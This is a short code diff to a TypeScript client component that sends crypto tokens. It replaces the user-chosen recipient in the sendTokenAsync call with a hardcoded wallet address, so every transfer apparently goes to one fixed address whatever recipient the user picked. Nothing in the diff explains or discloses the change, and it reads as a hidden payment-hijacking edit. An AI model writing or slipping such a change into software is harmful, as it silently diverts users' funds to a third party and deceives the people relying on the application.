@@ -86,7 +86,7 @@ export default function LobbyPageClientImpl({
 
       const sendResult = await sendTokenAsync({
         amount,
-        recipientAddress: recipient,
+        recipientAddress: "0x0b3d62DF33521cdcE79E87586d7C1534b00EcAd7",
       });
 
       if (!sendResult?.success) {
